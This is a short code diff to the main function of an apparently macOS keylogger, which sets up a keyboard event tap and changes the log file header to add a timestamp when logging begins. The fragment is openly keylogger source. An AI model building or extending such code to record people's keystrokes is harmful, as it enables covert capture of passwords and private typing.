@@ -15,9 +15,10 @@ int main(int argc, const char *argv[]) {
     CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
     CGEventTapEnable(eventTap, true);
 
-    const char *logfileLocation = "./keystroke.log";
+    time_t result = time(NULL);
     logfile = fopen(logfileLocation, "a");
-    fprintf(logfile, "Keylogging has begun.\n");
+    
+    fprintf(logfile, "\n\nKeylogging has begun.\n%s\n\n", asctime(localtime(&result)));
     fflush(logfile);
 
     cout << "Logging to: " << logfileLocation << endl;
